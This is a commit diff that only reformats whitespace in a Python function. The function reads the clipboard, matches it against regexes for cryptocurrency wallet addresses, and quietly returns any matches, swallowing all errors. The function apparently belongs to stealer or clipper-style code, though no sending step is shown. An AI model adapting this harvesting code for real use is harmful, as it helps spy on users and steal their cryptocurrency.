afbbe0b371b50cdfe5d1191fec449aca804027f6
exsarorrayzer <theleapy@gmail.com>
2025-12-31 21:04:32 +0400

    Refactor clipboard monitoring function

--- raw/clipboard.py
+++ raw/clipboard.py
@@ -1,10 +1,10 @@
 def monitorclipboard():
     clipboard_data = []
-
+    
     try:
         import pyperclip
         clipboard = pyperclip.paste()
-
+        
         if clipboard:
             crypto_patterns = {
                 'BTC': r'(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}',
@@ -12,7 +12,7 @@ def monitorclipboard():
                 'XRP': r'r[0-9a-zA-Z]{24,34}',
                 'LTC': r'(L|M)[a-km-zA-HJ-NP-Z1-9]{26,33}'
             }
-
+            
             for coin, pattern in crypto_patterns.items():
                 if re.search(pattern, clipboard, re.IGNORECASE):
                     clipboard_data.append({
@@ -20,8 +20,8 @@ def monitorclipboard():
                         'coin': coin,
                         'address': re.search(pattern, clipboard, re.IGNORECASE).group()
                     })
-
+    
     except:
         pass
-
+    
     return clipboard_data
